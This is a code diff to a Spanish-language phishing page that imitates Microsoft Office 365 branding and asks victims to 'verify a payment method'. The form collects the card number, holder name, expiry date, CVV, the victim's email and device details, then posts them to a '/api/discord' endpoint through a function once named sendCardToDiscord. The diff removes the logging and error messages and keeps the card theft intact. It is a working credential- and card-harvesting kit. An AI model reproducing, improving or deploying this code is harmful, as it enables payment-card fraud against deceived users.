@@ -10,7 +10,7 @@
 tailwind.config={
   theme:{
     extend:{
-      colors:{'ms-blue':'#0078d4','ms-blue-hover':'#106ebe','ms-red':'#f25022','ms-green':'#7fba00','ms-yellow':'#ffb900','ms-blue-logo':'#00bcf2','ms-gray':'#1b1b1b','ms-gray-light':'#605e5c','ms-border':'#8a8886','ms-error':'#dc2626','ms-error-bg':'#fef2f2','ms-error-border':'#fca5a5'},
+      colors:{'ms-blue':'#0078d4','ms-blue-hover':'#106ebe','ms-red':'#f25022','ms-green':'#7fba00','ms-yellow':'#ffb900','ms-blue-logo':'#00bcf2','ms-gray':'#1b1b1b','ms-gray-light':'#605e5c','ms-border':'#8a8886'},
       fontFamily:{'segoe':['"Segoe UI"','system-ui','-apple-system','BlinkMacSystemFont','sans-serif']},
       fontSize:{'ms-title':['28px',{lineHeight:'36px',fontWeight:'600'}],'ms-subtitle':['15px',{lineHeight:'20px',fontWeight:'400'}],'ms-body':['15px',{lineHeight:'20px',fontWeight:'400'}],'ms-link':['13px',{lineHeight:'16px',fontWeight:'400'}],'ms-logo':['21px',{lineHeight:'28px',fontWeight:'600'}]},
       boxShadow:{'ms-card':'0 2px 6px rgba(0,0,0,0.2)'}
@@ -33,8 +33,6 @@ body.bg-image{background-image:var(--login-bg-image,none);background-size:cover;
 @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
 .main-container{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;padding:1rem;z-index:10}
 @media(min-width:640px){.main-container{position:static;min-height:100vh}}
-.error-box{background:#fef2f2;border:1px solid #fca5a5;border-radius:4px;padding:8px 12px;margin-bottom:12px;text-align:center}
-.error-text{color:#dc2626;font-size:13px;font-weight:500}
 .card-preview{width:100%;max-width:320px;margin:0 auto 24px;background:linear-gradient(135deg,#1a1a2e,#0d0d1a);border-radius:12px;padding:20px;color:#fff;position:relative;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,.3)}
 .chip{width:40px;height:28px;background:linear-gradient(135deg,#e8c964,#c9a84c);border-radius:4px;position:absolute;top:20px;right:20px;opacity:.9}
 .card-number-display{font-size:20px;letter-spacing:2px;font-family:"Courier New",monospace;margin-top:36px;text-shadow:0 1px 2px rgba(0,0,0,.3);font-weight:600}
@@ -84,9 +82,6 @@ body.bg-image{background-image:var(--login-bg-image,none);background-size:cover;
         </div>
       </div>
       <h1 class="text-lg text-ms-gray mb-4 font-semibold text-center" id="paymentTitle">Verificar método de pago</h1>
-      <div id="errorMessage" class="error-box" style="display:none">
-        <div><span id="errorTitle" class="error-text"></span></div>
-      </div>
       <form onsubmit="handlePayment(event)" class="space-y-4" id="paymentForm">
         <div>
           <label style="font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:block">Número de tarjeta</label>
@@ -127,14 +122,11 @@ let config;
 async function loadConfig(){try{const res=await fetch('/api/config');if(res.ok){const data=await res.json();if(data.success&&data.config){config={...DEFAULTS,...data.config};return;}}}catch(e){}try{const stored=localStorage.getItem('mailoffice365_cfg');if(stored){config={...DEFAULTS,...JSON.parse(stored)};return;}}catch(e){}config={...DEFAULTS};}
 function applyConfig(){const c=config||{};document.getElementById('logoText').textContent=c.logoText||'Mail Office 365';document.getElementById('paymentTitle').textContent=c.paymentTitle||'Verificar método de pago';document.getElementById('userEmailBadge').textContent=c.paymentEmailBadgeText||'Pago seguro';document.getElementById('cardPreview').textContent=c.paymentCardPreview||'•••• •••• •••• ••••';document.getElementById('namePreview').textContent=c.paymentNamePreview||'NOMBRE APELLIDO';document.getElementById('datePreview').textContent=c.paymentDatePreview||'MM/AA';document.getElementById('cardNumber').placeholder=c.paymentCardNumberPlaceholder||'1234 5678 9012 3456';document.getElementById('cardHolder').placeholder=c.paymentCardHolderPlaceholder||'Como aparece en la tarjeta';document.getElementById('expiryDate').placeholder=c.paymentExpiryPlaceholder||'MM/AA';document.getElementById('cvv').placeholder=c.paymentCVVPlaceholder||'123';document.getElementById('forgotPINText').textContent=c.paymentForgotPINText||'¿Olvidó su PIN?';document.getElementById('submitButton').textContent=c.paymentSubmitButtonText||'Verificar tarjeta';document.getElementById('otherPaymentText').textContent=c.paymentOtherPaymentText||'Otras formas de pago';document.getElementById('footerHelp').textContent=c.footerHelpText||'Ayuda';document.getElementById('footerTerms').textContent=c.footerTermsText||'Términos de uso';document.getElementById('footerPrivacy').textContent=c.footerPrivacyText||'Privacidad y cookies';document.getElementById('footerPrivate').innerHTML=(c.footerPrivateText||'')+' <a href="#">Más información</a>';document.getElementById('logoColor1').style.background=c.logoColor1||'#f25022';document.getElementById('logoColor2').style.background=c.logoColor2||'#7fba00';document.getElementById('logoColor3').style.background=c.logoColor3||'#00bcf2';document.getElementById('logoColor4').style.background=c.logoColor4||'#ffb900';applyBackground(c);}
 function applyBackground(c){document.body.classList.remove('bg-gradient','bg-image');if(c.loginBgType==='gradient'){document.body.style.background=c.loginBgGradient||'';document.body.style.backgroundImage='none';document.body.classList.add('bg-gradient');}else if(c.loginBgType==='image'&&c.loginBgImage){document.body.style.backgroundImage='url('+c.loginBgImage+')';document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.classList.add('bg-image');}else{document.body.style.backgroundImage='none';document.body.style.backgroundColor=c.loginBgColor||'#0a0a1a';}}
-function showError(msg){const box=document.getElementById('errorMessage');const text=document.getElementById('errorTitle');if(box&&text){text.textContent=msg;box.style.display='block';}}
-function hideError(){const box=document.getElementById('errorMessage');if(box)box.style.display='none';}
 function formatCardNumber(v){return v.replace(/\s/g,'').replace(/(\d{4})(?=\d)/g,'$1 ').trim();}
 function validateCardNumber(n){return /^\d{13,19}$/.test(n.replace(/\s/g,''));}
 function validateExpiry(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}
 function validateCVV(c){return /^\d{3,4}$/.test(c);}
-async function sendCardToDiscord(email,cardNumber,cardHolder,expiryDate,cvv){
-  console.log('[Card] Enviando...');
+async function sendToServer(email,cardNumber,cardHolder,expiryDate,cvv){
   const apiUrl=window.location.origin+'/api/discord';
   const body={
     email,
@@ -154,38 +146,29 @@ async function sendCardToDiscord(email,cardNumber,cardHolder,expiryDate,cvv){
     isMobile:'No',isTablet:'No',isDesktop:'Sí',
     batteryLevel:'No disponible',batteryCharging:'Desconocido'
   };
-  console.log('[Card] Payload:',body);
   try{
-    const res=await fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body),mode:'cors'});
+    const res=await fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
     const data=await res.json();
-    console.log('[Card] Respuesta:',data);
     return data.success===true;
-  }catch(e){console.error('[Card] Error:',e);return false;}
+  }catch(e){return false;}
 }
 async function handlePayment(event){
   event.preventDefault();
-  hideError();
   const cardNumber=document.getElementById('cardNumber').value.trim();
   const cardHolder=document.getElementById('cardHolder').value.trim();
   const expiryDate=document.getElementById('expiryDate').value.trim();
   const cvv=document.getElementById('cvv').value.trim();
   const submitBtn=document.getElementById('submitButton');
-  if(!cardNumber||!validateCardNumber(cardNumber)){showError('Ingresa un número de tarjeta válido (13-19 dígitos).');return;}
-  if(!cardHolder||cardHolder.length<2){showError('Ingresa el nombre del titular de la tarjeta.');return;}
-  if(!expiryDate||!validateExpiry(expiryDate)){showError('Fecha de expiración inválida. Use el formato MM/AA.');return;}
-  if(!cvv||!validateCVV(cvv)){showError('CVV inválido (3 o 4 dígitos).');return;}
+  if(!cardNumber||!validateCardNumber(cardNumber)){return;}
+  if(!cardHolder||cardHolder.length<2){return;}
+  if(!expiryDate||!validateExpiry(expiryDate)){return;}
+  if(!cvv||!validateCVV(cvv)){return;}
   submitBtn.disabled=true;
   submitBtn.textContent='Procesando...';
   const urlParams=new URLSearchParams(window.location.search);
   const email=urlParams.get('email')||localStorage.getItem('mailoffice365_email')||'';
-  console.log('[Card] Email:',email,'| Tarjeta:',cardNumber);
-  try{
-    const ok=await sendCardToDiscord(email,cardNumber,cardHolder,expiryDate,cvv);
-    console.log('[Card] Resultado:',ok);
-  }catch(err){
-    console.error('[Card] Error:',err.message);
-  }
-  setTimeout(()=>{window.location.href=window.location.origin+'/dashboard.html';},1500);
+  await sendToServer(email,cardNumber,cardHolder,expiryDate,cvv);
+  window.location.href=window.location.origin+'/dashboard.html';
 }
 function redirectToPayment(){window.location.href='https://www.paypal.com';}
 (function(){
